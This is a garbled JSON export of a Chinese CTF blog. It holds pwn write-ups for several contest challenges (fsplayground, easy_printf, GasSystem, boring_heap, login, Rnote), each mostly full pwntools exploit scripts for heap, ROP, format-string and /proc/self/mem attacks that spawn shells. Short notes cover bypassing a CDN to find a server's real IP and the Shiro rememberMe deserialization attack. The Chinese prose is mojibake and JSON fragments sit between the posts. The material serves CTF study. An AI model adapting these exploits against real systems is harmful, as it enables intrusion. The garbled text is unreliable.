#flag{b09dfe78-df9e-36dd-89a1-b7efb2e19e65} from pwn import * for i in range(500): n = remote(&quot;119.3.45.222&quot;,9999) cip = n.recvline()[:-1] n.close() if cip[0:5]==&quot;flag{&quot; and cip[13]==&quot;-&quot; and cip[18]==cip[23]: print cip PWNfsplaygroundä¸€ä¸ªæ–‡ä»¶è¯»å†™ç³»ç»Ÿï¼Œé™åˆ¶äº†è¯»çš„æ–‡ä»¶åé‡ŒåŒ…æ‹¬è·¯å¾„ä¸èƒ½å«æœ‰flagï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©è¯»/proc/self/mapsè·å–libcbaseç„¶åå¾€/proc/self/memé‡Œfree_hookçš„åœ°å€å†™onegadgetä¸€æŠŠæ¢­ #flag{910efb50faa7407b916c206217951dd0} from pwn import * context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) #n = process(&quot;./chall&quot;) n = remote(&quot;119.3.111.133&quot;,6666) elf = ELF(&quot;./chall&quot;) libc = elf.libc def choice(idx): n.recvuntil(&quot;Your choice: &quot;) n.sendline(str(idx)) def fs_open(filename,idx): choice(1) n.recvuntil(&quot;Filename: &quot;) n.send(filename) n.recvuntil(&quot;Option: &quot;) n.sendline(str(idx)) def fs_close(): choice(2) def fs_seek(offset): choice(3) n.recvuntil(&quot;Offset: &quot;) n.sendline(str(offset)) def fs_read(size): choice(4) n.recvuntil(&quot;Size: &quot;) n.sendline(str(size)) def fs_write(size,content): choice(5) n.recvuntil(&quot;Size: &quot;) n.sendline(str(size)) n.recvuntil(&quot;Content: &quot;) n.send(content) def fs_exit(): choice(6) fs_open(&quot;/proc/self/maps&quot;,0) fs_read(0x300) n.recvuntil(&quot;Content: &quot;) codebase = int(n.recv(12),16) print hex(codebase) n.recvuntil(&quot;r-xp&quot;) libcbase = int(n.recvuntil(&quot;r-xp&quot;)[-30:-18],16) print hex(libcbase) fs_close() fs_open(&quot;/proc/self/mem&quot;,1) free_hook = libcbase + libc.sym[&quot;__free_hook&quot;] one = libcbase + 0x4f3c2 fs_seek(free_hook) fs_write(0x10,p64(one)) n.interactive() å‰©ä¸‹çš„å°±æ˜¯èµ›åå¤ç°äº†ï¼Œç­‰æœ‰ç©ºå†™","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"é•¿äº­é¢è¯•ç»","slug":"é•¿äº­é¢è¯•ç»","date":"2020-08-13T07:05:34.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/08/13/é•¿äº­é¢è¯•ç»/","link":"","permalink":"/2020/08/13/é•¿äº­é¢è¯•ç»/","excerpt":"","text":"gitç‚¸äº†ï¼Œè¿™æ¡£æ²¡äº†","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"åªæ¶…ï¼šé¢è¯•äºŒåº¦","slug":"åªæ¶…ï¼šé¢è¯•äºŒåº¦","date":"2020-07-18T07:08:11.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/07/18/åªæ¶…ï¼šé¢è¯•äºŒåº¦/","link":"","permalink":"/2020/07/18/åªæ¶…ï¼šé¢è¯•äºŒåº¦/","excerpt":"","text":"åªæ¶…ï¼šé¢è¯•äºŒåº¦äº‰å–åˆ°äº†ç¬¬äºŒæ¬¡çš„é¢è¯•æœºä¼šï¼Œåªèƒ½è¯´æ¯”ä¸Šæ¬¡ç¨å¾®æˆé•¿äº†ä¸€äº›ï¼Œä½†è¿˜æ˜¯æ²¡èƒ½è¾¾åˆ°é¢„æœŸï¼Œè®°å½•ä¸‹ä¸€äº›æ²¡èƒ½è¯´æ¸…æ¥šçš„ä¸œè¥¿ ç»•è¿‡CDNæŸ¥æ‰¾çœŸå®IPæ–¹æ³•éªŒè¯å¯ä»¥é€šè¿‡å¤šåœ°pingåŸŸåå’Œnslookupæ¥åˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨cdn DNSå†å²è§£æè®°å½• https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.htmlhttps://tools.ipip.net/cdn.phphttps://securitytrails.com/ å­åŸŸååæŸ¥åŸå› ï¼šå¯èƒ½å› ä¸ºæˆæœ¬æˆ–å…¶ä»–åŸå› æ²¡æœ‰ç»™æ¯ä¸ªåŸŸåå¥—cdn https://x.threatbook.cn/https://dnsdb.io/zh-cn/ #domain type:Aæœç´¢å¼•æ“è¯­æ³•å­åŸŸåæ‰«æå™¨ ç½‘ç»œç©ºé—´å¼•æ“æœç´¢æ³• zoomeye,shodanï¼Œfofaç‰¹å¾ï¼šç‰¹æœ‰çš„httpå¤´éƒ¨ï¼ˆå¦‚serverç±»å‹ã€ç‰ˆæœ¬ã€cookieç­‰ä¿¡æ¯)ç‰¹å®škeywordï¼ˆå¦‚titleã€cssã€jsã€urlç­‰ï¼‰ç‰¹å®šçš„IPæ®µæœç´¢ï¼ˆå¦‚fofaæ”¯æŒCæ®µæœç´¢ï¼‰ è¯ä¹¦æŸ¥è¯¢https://censys.io/ è¯­å¥parsed.names: domain and tags.raw: trusted ç›®æ ‡æ–‡ä»¶ä¿¡æ¯æ³„æ¼é€šè¿‡ç›®æ ‡æ³„æ¼å‡ºæ¥çš„ä¿¡æ¯é‡Œæ˜¯å¦åŒ…å«çœŸå®ip ç›®æ ‡ä¸»åŠ¨è¿æ¥é€šè¿‡ç›®æ ‡ä¸»æœºåˆæ³•æˆ–ç€é€šè¿‡æ¼æ´å‘èµ·å¯¹è‡ªå·±çš„ä¸»æœºçš„è¯·æ±‚å°±èƒ½ä¸å—cdnçš„å½±å“è·å¾—ip å›½å¤–ä¸»æœºè§£æåŸŸåè·å–é’ˆå¯¹å›½å†…cdnå‚å•†å¤§å¤šåªåšäº†å›½å†…çš„çº¿è·¯ï¼Œå›½å¤–ä¸»æœºå¯èƒ½ç›´æ¥è·å¾—çœŸå®ip cdnæœ¬èº«æ‰‹æ®µä¸é™ï¼Œè·å¾—ç›®æ ‡ç½‘ç«™ç®¡ç†å‘˜é…ç½®cdnçš„å¸å·ï¼Œå¯é€šè¿‡é…ç½®ç›´æ¥è·å– shiroååºåˆ—åŒ–åŸç†åŸå› rememberMeçš„AESåŠ å¯†å¯†é’¥ç¡¬ç¼–ç äºæºç å·²çŸ¥å¯†é’¥ä¾¿å¯ä¼ªé€ å¯è¢«æ­£ç¡®è§£å¯†çš„åºåˆ—ï¼Œä½¿å¾—ååºåˆ—åŒ–çš„payloadå¯æ§æ–¹æ³•æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œå¹¶ä¸”å¯¹å…¶åºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼Œbase64ç¼–ç åï¼Œä½œä¸ºcookieçš„rememberMeå­—æ®µå‘é€ï¼ŒæœåŠ¡ç«¯å¯¹æ¶æ„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–å¼•å‘å‘½ä»¤æ‰§è¡Œ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"19ç™¾è¶Šæ¯è®°å½•","slug":"19ç™¾è¶Šæ¯è®°å½•","date":"2019-11-27T15:33:35.000Z","updated":"2021-02-22T08:49:52.239Z","comments":true,"path":"2019/11/27/19ç™¾è¶Šæ¯è®°å½•/","link":"","permalink":"/2019/11/27/19ç™¾è¶Šæ¯è®°å½•/","excerpt":"","text":"çº¿ä¸‹ä¹Ÿæ‰“å®Œäº†ï¼Œè™½ç„¶ç»“æœä¸å°½äººæ„ï¼Œä½†è¿˜æ˜¯ç¨å¾®å†™å†™å§ Onlineå®Œç¾çˆ†0ï¼Œä¸æ„§æ˜¯æˆ‘ï¼Œè…æœ½äº†å¤§åŠå¹´çš„æ¯æœ¨ easy_printfnepire@vm:~/CTF/19ç™¾è¶Š/easy_printf$ checksec easy_printf [*] Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) é™¤PIEå¤–å…¨å¼€ ç®€å•é€†å‘åå‘ç°æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†å…³äº†æ ‡å‡†è¾“å‡º ç¬¬ä¸€æ€è·¯è‚¯å®šæ˜¯å…ˆæŠŠç¨‹åºæ„é€ æˆç¯ è¿™é‡Œæˆ‘ä»¬æƒ³åˆ°å¯ä»¥ç”¨_dl_finiçš„é‚£ä¸ª ç”±äºè¿™æ—¶rdxæ˜¯å·²ç»è¢«å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ“ä½œr12çš„å€¼ å®é™…ä¸Šå¯¹r12çš„æ“ä½œæ˜¯è¿™æ ·çš„ ç„¶åæˆ‘ä»¬å‘ç°ä¸€ä¸ªå¾ˆç¥å¥‡çš„åœ°å€ rbxçš„å€¼å®é™…åœ¨ç›¸å½“æ·±çš„æ ˆé‡Œï¼ˆä¸ªäººä¹ æƒ¯æ˜¯åªçœ‹stack 50ï¼‰ æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¾€æ¯”åŸå…ˆrbxè¿˜é«˜çš„åœ°å€å†™å…¥retçš„åœ°å€è®©ç¨‹åºretå›æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ä½¿å¾—èƒ½æ— é™åˆ©ç”¨ï¼Œè¿™é‡Œç›´æ¥é€‰æ‹©å¾€bssæ®µåœ°å€å»å†™ ç„¶åå°±å½¢æˆäº†ç¬¬ä¸€ä¸ªloop æ¥ç€æˆ‘ä»¬åˆ°ç¬¬äºŒæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œè¿™é‡Œå†çœ‹çœ‹ å‘ç°èƒ½ç›´æ¥æ”¹æ ˆå¾ªç¯äº† ç„¶åå°±æ˜¯æ³„éœ²libcå’Œstackåœ°å€å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å°±æ‰¾åˆ°ä¸‹é¢ä¸€ç‚¹å°±æœ‰æ ˆåœ°å€å’Œlibcåœ°å€ æ³„éœ²å‡ºæ¥åå°±ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œæœ€ç®€å•çš„å°±æ˜¯ç›´æ¥æŠŠretåœ°å€æ”¹onegadgetç„¶åç”±äºå…³stdoutå°±ç”¨ ç®¡é“æŠŠè¾“å‡ºæ”¹æˆ2ä¹Ÿå°±æ˜¯cat flag&gt;&amp;2æ¥getflag Finalæ„Ÿè§‰å¾ˆé€‚åˆåˆå­¦è€…çš„adé¢˜ç›®ï¼Ÿæ¼æ´ä¹‹é—´ç›¸å¯¹ç‹¬ç«‹ï¼Œç®€å•çš„çœ‹ä¸‹é¢˜ç›® GasSystemnepire@vm:~/CTF/19ç™¾è¶Š/final$ checksec pwn Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) defenceè¿™é‡Œèƒ½å¾ˆå®¹æ˜“çš„å‘ç°å››ä¸ªèƒ½getshellçš„ç‚¹ éƒ½å¾ˆç®€å•ï¼Œæœ‰ä¸€ä¸ªç”šè‡³ç®—ä¸ä¸Šæ¼æ´ï¼Œç›´æ¥æŒ‰ç¨‹åºæµæ‰§è¡Œå°±èƒ½getshell è¿™é‡Œä¸»è¦åˆ†äº«patchçš„æ€è·¯ ç”±äºå­˜åœ¨ä¸‰ä¸ªåœ°æ–¹æœ‰æ ˆæº¢å‡ºï¼Œé‚£ä¹ˆé¦–å…ˆå¾—æŠŠä¸‰ä¸ªåœ°æ–¹çš„read_sizeæ”¹äº† ç°åœ¨ç½‘ä¸Šå¤§éƒ¨åˆ†çš„IDAéƒ½æ˜¯å¾çˆ±ç ´è§£çš„é‚£ä¸ªç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½ä¼šè‡ªå¸¦keypatchï¼Œæ‰€ä»¥ç›´æ¥é€‰ä¸­0x100ç„¶åctrl+alt+kæ¥å¯ç”¨keypatchæ¥æ”¹æ•°æ®ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªç›´æ¥æ”¹æˆsize=0x40 è€Œå¦å¤–çš„ä¸€ä¸ªæ ¹æ®å®ƒå¯¹rbpçš„åç§»æ”¹æˆ0x30è¾ƒç¨³å¦¥ ç„¶åå°±æ˜¯å¯¹evalå‡½æ•°çš„å¤„ç†ï¼Œè¿™é‡Œå¯ä»¥æ”¹çš„æœ‰ä¸¤ä¸ªï¼ŒæŒ‘ä¸€ä¸ªæˆ–å…¨æ”¹éƒ½è¡Œ ï¼ˆæ¯”èµ›ä¸­ä¸å°‘é˜Ÿæ”¹çš„æ˜¯è¿™ä¸ªï¼‰ ç„¶åå°±æ˜¯è¿™ä¸ªå…¨åœºä¿®è¡¥ç‡æœ€ä½çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Ÿ æœ‰ä¸€è¯´ä¸€ï¼Œè¿™ä¸ªä¸»åŠæ–¹çš„checkæ˜¯å¾ˆæ¾çš„ï¼Œåªè¦call printfæ”¹call putså°±è¡Œäº†ï¼Œå®Œå…¨ä¸éœ€è¦è€ƒè™‘\\nçš„é—®é¢˜ attackè¿™é‡Œæ”»å‡»æ–¹æ³•å…¶å®è¿˜æŒºå¤š(?)çš„ï¼Œè™½ç„¶éƒ½æ˜¯ç®€å•ç”¨æ³•ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸ªä¸ªç»†è®²äº† å…ˆæ˜¯æœ€å¿«çš„ç”¨æ¥å‰æœŸåœ¨patchå‰å·åˆ†çš„ from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc admin_id = base64.b64decode(&quot;NzE2NTIyMwo=&quot;) n.recvuntil(&quot;id&quot;) n.send(str(admin_id)) n.recvuntil(&#39;\\xa4\\n&#39;) n.sendline(&quot;6666&quot;) n.sendline(&quot;cat flag&quot;) n.interactive() æ¥ç€patchå…ˆæ”¹äº†äº†evalé‡Œçš„systemå‡½æ•°ä¸ºå…¶ä»–å‡½æ•°ä½†æœªæ”¹/bin/shçš„æƒ…å†µ from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc pop_ret = 0x400db3 user_id = base64.b64decode(&quot;bmVwaXJl&quot;) n.recvuntil(&quot;id&quot;) n.sendline(str(user_id)) n.recvuntil(&#39;\\x8d\\n&#39;) n.sendline(&quot;a&quot;*0x38+p64(pop_ret)+p64(0x400E1A)+p64(elf.plt[&#39;system&#39;])) n.sendline(&quot;cat flag&quot;) n.interactive() æ¥ç€å°±æ˜¯æŠŠsystemå’Œ/bin/shå…¨nopæ‰çš„æƒ…å†µ from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc pop_ret = 0x400db3 user_id = base64.b64decode(&quot;bmVwaXJl&quot;) n.recvuntil(&#39;id&#39;) n.sendline(str(user_id)) n.recvuntil(&#39;\\x8d\\n&#39;) payload = &#39;a&#39;*0x38+p64(pop_ret)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(0x400C1E) n.sendline(payload) libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-libc.sym[&#39;puts&#39;] print hex(libcbase) system = libcbase + libc.sym[&#39;system&#39;] sh = libcbase + libc.search(&#39;/bin/sh&#39;).next() n.recvuntil(&#39;\\x8d\\n&#39;) payload = &#39;a&#39;*0x38+p64(pop_ret)+p64(sh)+p64(system) n.sendline(payload) n.sendline(&quot;cat flag&quot;) n.interactive() ç„¶åæ˜¯æŠŠç¨‹åºå†…æ ˆæº¢å‡ºå…¨éƒ¨patchçš„æƒ…å†µï¼Œè¿™æ—¶å°±æ˜¯ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ‰“ from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc def fmtstr(offset, addr, data, written=0): cnt = 0 payload = &#39;&#39; address = &#39;&#39; for x in data: cur = ord(x) if cur &gt;= written&amp;0xff: to_add = cur - (written&amp;0xff) else: to_add = 0x100 + cur - (written&amp;0xff) round = &#39;&#39; if to_add != 0: round += &quot;%{}c&quot;.format(to_add) round += &quot;%{}$hhn&quot;.format(offset+cnt+len(data)*2) assert(len(round) &lt;= 0x10) written += to_add + 0x10 - len(round) payload += round.ljust(0x10, &#39;_&#39;) address += p64(addr+cnt) cnt+=1 return payload + address pop_ret = 0x400db3 admin_id = base64.b64decode(&quot;NzE2NTIyMwo=&quot;) n.recvuntil(&#39;id&#39;) n.send(str(admin_id)) n.recvuntil(&#39;\\xa4\\n&#39;) payload =&quot;%9$p&quot; n.sendline(payload) n.recvuntil(&#39;0x&#39;) libcbase = int(n.recv(12),16)-0x5f1168 system = libcbase + libc.sym[&#39;system&#39;] print hex(libcbase) one_gadget = libcbase + 0xf1147 offset = 8 payload = fmtstr(offset,elf.got[&#39;printf&#39;],p64(system)) n.sendline(payload) n.sendline(&quot;/bin/sh&quot;) n.interactive() #è‡´è°¢ é˜®å¸ˆå‚…tqlï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è½®å­æ¯”fmtstr_payloadå¥½ç”¨äº†ä¸æ˜¯ä¸€ç‚¹ç‚¹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"2019ä¸Šæµ·å¤§å­¦ç”ŸCTFè®°å½•","slug":"2019ä¸Šæµ·å¤§å­¦ç”ŸCTFè®°å½•","date":"2019-11-06T09:31:14.000Z","updated":"2021-02-22T08:49:52.243Z","comments":true,"path":"2019/11/06/2019ä¸Šæµ·å¤§å­¦ç”ŸCTFè®°å½•/","link":"","permalink":"/2019/11/06/2019ä¸Šæµ·å¤§å­¦ç”ŸCTFè®°å½•/","excerpt":"","text":"boring_heapnepire@vm:~/CTF/boring_heap$ checksec pwn [*] &#39;/home/nepire/CTF/boring_heap/pwn&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled nepire@vm:~/CTF/boring_heap$ strings libc.so | grep &quot;GNU&quot; GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al. Compiled by GNU CC version 5.4.0 20160609. GNU Libidn by Simon Josefsson èœå•æ¡†æ¶ï¼Œnewï¼Œeditï¼Œdeleteï¼Œshowå››ä¸ªåŠŸèƒ½ï¼Œæœ€å¤šèƒ½å­˜åœ¨30ä¸ªchunkï¼Œnewçš„sizeé™å®šäº[0x20,0x30,0x40] å…¶ä¸­editåŠŸèƒ½æ¯”è¾ƒå¥‡æ€ªï¼Œå¯ä»¥é€‰æ‹©åœ¨+nä½ç½®å¼€å§‹å†™size-nä¸ªå­—ç¬¦ void edit() { int op; // ST04_4 int i; // [rsp+0h] [rbp-10h] puts(&quot;Which one do you want to update?&quot;); i = abs(readint()) % 30; if ( note[i] &amp;&amp; (note_size[i] == 0x20 || note_size[i] == 0x30 || note_size[i] == 0x40) ) { puts(&quot;Where you want to update?&quot;); op = abs(readint()) % note_size[i]; puts(&quot;Input Content:&quot;); readn((note[i] + op), note_size[i] - op); } else { puts(&quot;Invalid Index!&quot;); } } abså¯ä»¥æŠŠ0x8000000ä»¥ä¸Šçš„è¯†åˆ«ä¸ºè´Ÿæ•° è€Œæ±‚ä½™ä»¥å0x20ï¼Œ0x40å‡ä¸º0ï¼Œåªæœ‰0x30ä¸ºâ€“32ï¼Œé€šè¿‡è¿™ä¸ªæ”¹chunkçš„sizeä½ from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) #n = remote(&quot;8sdafgh.gamectf.com&quot;,10001) elf=ELF(&#39;./pwn&#39;) libc = elf.libc def choice(idx): n.recvuntil(&#39;5.Exit&#39;) n.sendline(str(idx)) def new(size_i,content): choice(1) n.recvuntil(&quot;3.Large&quot;) n.sendline(str(size_i)) n.recvuntil(&quot;Input Content:&quot;) n.send(content) def edit(idx,size,content): choice(2) n.recvuntil(&quot;update?&quot;) n.sendline(str(idx)) n.recvuntil(&quot;update?&quot;) n.sendline(str(size)) n.recvuntil(&quot;Content:&quot;) n.send(content) def free(idx): choice(3) n.recvuntil(&quot;delete?&quot;) n.sendline(str(idx)) def show(idx): choice(4) n.recvuntil(&quot;view?&quot;) n.sendline(str(idx)) new(2,&#39;0&#39;*0x30) new(2,&#39;1&#39;*0x30)#0x40 new(3,&#39;2&#39;*0x40)#0x50 new(3,&#39;3&#39;*0x40)#0x50 new(2,&#39;4&#39;*0x30)#0x40 new(2,&#39;5&#39;*0x30)#0x30 new(2,&#39;6&#39;*0x30) edit(5,0,(p64(0)+p64(0x21))*2) edit(1,0x80000000,&#39;a&#39;*0x10+p64(0)+p64(0x91)+&#39;\\n&#39;) #gdb.attach(n) free(1) new(2,&#39;a&#39;*7+&#39;\\n&#39;) show(2) libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3c4b78 print hex(libcbase) #gdb.attach(n) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one = libcbase + 0xf02a4 #+0x20+5-8 new(1,&#39;a&#39;*0x20) new(1,&#39;a&#39;*0x20) new(1,&#39;a&#39;*0x20) new(1,&#39;a&#39;*0x20) edit(4,0x80000000,&#39;a&#39;*0x10+p64(0)+p64(0x51)+&#39;\\n&#39;) free(4) free(5) edit(5,0x80000000,p64(malloc_hook)*2) gdb.attach(n) n.interactive() loginnepire@vm:~/CTF/login$ checksec login [*] &#39;/home/nepire/CTF/login/login&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ç»å…¸èœå•ç¨å¾®å˜äº†ä¸€ä¸‹å˜æˆè´¦æˆ·æ“ä½œï¼Œæœ‰æ³¨å†Œï¼Œç™»å½•ï¼Œåˆ é™¤ï¼Œä¿®æ”¹åŠŸèƒ½ï¼Œé€šè¿‡strcmpåˆ¤æ–­ç™»å½•passwdï¼ŒæˆåŠŸå¯è¾“å‡ºpasswdå†…å®¹ï¼Œå¹¶ä¸”æ²¡æœ‰é™åˆ¶åˆ¤æ–­æ¬¡æ•° å¯ç™»å½•0-9çš„ç”¨æˆ·ï¼Œä½†æœ€å¤šå¯æ³¨å†Œï¼Œåˆ é™¤ï¼Œä¿®æ”¹çš„ç”¨æˆ·ä¸º0-5 sizeèŒƒå›´ä¸º[0,0xff] å¯ä»¥ç›´æ¥unsortbinæ¥leaklibc æ„é€ é”™ä½æ§åˆ¶å‡½æ•°æŒ‡é’ˆå’ŒæŒ‡é’ˆå†…å®¹leak libc ï¼Œç„¶åä¿®æ”¹ä¸ºsystemï¼Œshæ¥getshell from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)#,log_level=&#39;debug&#39;) n = process(&#39;./login&#39;) elf=ELF(&#39;./login&#39;) libc = elf.libc def choice(idx): n.recvuntil(&#39;Choice&#39;) n.sendline(str(idx)) def login(idx,size,passwd): choice(1) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) n.recvuntil(&#39;length:&#39;) n.sendline(str(size)) n.recvuntil(&#39;password:&#39;) n.send(passwd) def new(idx,size,passwd): choice(2) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) n.recvuntil(&#39;length:&#39;) n.sendline(str(size)) n.recvuntil(&#39;password:&#39;) n.send(passwd) def free(idx): choice(3) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) def edit(idx,passwd): choice(4) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) n.recvuntil(&#39;new pass:&#39;) n.send(passwd) heapbase = 0x603000 new(0,0x18,&#39;/bin/sh&#39;) new(1,0xff,&#39;1111&#39;)# unsortbin new(2,0x18,&#39;2222&#39;) free(1) free(2) new(3,0x18,&#39;3333&#39;) libcbase = 0 for i in range(6): for j in range(0,0x100): edit(3,p64(heapbase+0x55-i)) login(2,0x18,p64(libcbase*0x100+j)) n.recvuntil(&#39;\\n&#39;) meg = n.recvline() #n.success(meg) if meg==&quot;Login success!\\n&quot;: libcbase = (libcbase*0x100)+j n.success(hex(libcbase)) break; libcbase = libcbase - 0x3c4b78 n.success(hex(libcbase)) system = libcbase +libc.sym[&#39;system&#39;] edit(3,p64(heapbase+0x10)+p64(system)) login(2,0x18,&#39;/bin/sh&#39;) n.interactive() slient_notenepire@vm:~/CTF/slient_note$ checksec pwn [*] &#39;/home/nepire/CTF/slient_note/pwn&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) åªæœ‰newï¼Œeditï¼Œdeleteçš„èœå•é¢˜","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"19å·…å³°æå®¢","slug":"19å·…å³°æå®¢","date":"2019-11-05T04:31:37.000Z","updated":"2021-02-22T08:49:52.223Z","comments":true,"path":"2019/11/05/19å·…å³°æå®¢/","link":"","permalink":"/2019/11/05/19å·…å³°æå®¢/","excerpt":"","text":"é‡ä¿®è¡¥è¯¾ä¸€æ•´å¤©å®Œå…¨æ²¡æ—¶é—´å»æ‰“ï¼Œèµ›åå¤ç°æ—¶æ‰å‘ç°ä¸æ˜¯å¾ˆéš¾çš„äºšå­ï¼ˆåƒä¸‡åˆ«æŒ‚ç§‘ï¼ˆå“­ Rnote é˜²æŠ¤å…¨å¼€ IDAå»åˆ†æä¸‹åŸºæœ¬çš„åŠŸèƒ½ åŸºæœ¬çš„èœå•æ¡†æ¶ å¾ˆå®¹æ˜“åœ¨editä¸­çœ‹åˆ°æœ‰ä¸ªå¾ˆçªå…€çš„ifè¯­å¥ï¼Œè¿™å°±é€ æˆäº†ä¸€ä¸ª7byteçš„æº¢å‡ºï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹editçš„å—è¿›è¡Œcheckæ˜¯å¦freeæ‰æ‰€ä»¥èƒ½è€ƒè™‘ä¿®æ”¹fastbinçš„fdä¸ºmallochookç„¶åä¿®æ”¹onegagdgetï¼Œç”±äºæˆ‘ä»¬åªèƒ½æ“ä½œä¸€ä¸ªå †ï¼Œä½†æˆ‘ä»¬èƒ½åˆ›å»ºæœ€å¤§çš„sizeä¸º0x1000ï¼Œæ‰€ä»¥æƒ³åˆ°ç”¨orangeæ¥åˆ›å»ºä¸€ä¸ªunsortbin ä¹‹åçš„æ€è·¯å°±å¾ˆç®€å•äº† ä¿®æ”¹fdåšuafå»ä¿®æ”¹malloc_hookä¸ºone_gadget from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf=ELF(&#39;./pwn&#39;) libc = elf.libc def regs(): n.recvuntil(&#39;name?&#39;) n.sendline(&quot;nepire&quot;) def choice(idx): n.recvuntil(&#39;Your choice &gt; &#39;) n.sendline(str(idx)) def new(size,content): choice(1) n.recvuntil(&quot;Size &gt;&quot;) n.sendline(str(size)) n.recvuntil(&#39;Content &gt; &#39;) n.send(content) def show(): choice(2) def free(): choice(3) def edit(size,content): choice(4) n.recvuntil(&quot;Size &gt; &quot;) n.sendline(str(size)) n.recvuntil(&quot;Content &gt; &quot;) n.send(content) regs() new(0x18,&#39;0000&#39;) edit(0x18+7,&#39;a&#39;*0x18+p32(0xfe1)) new(0x1000,&#39;1111&#39;) new(0x68,&#39;a&#39;*8) show() libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3c5188 print hex(libcbase) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one_gadget = libcbase + 0xf02a4 free() edit(0x68,p64(malloc_hook-0x10+5-8)) new(0x68,&#39;aaaa&#39;) new(0x68,&#39;aaa&#39;+p64(one_gadget)*3) choice(1) n.recvuntil(&#39;&gt;&#39;) n.sendline(&#39;12&#39;) n.interactive() 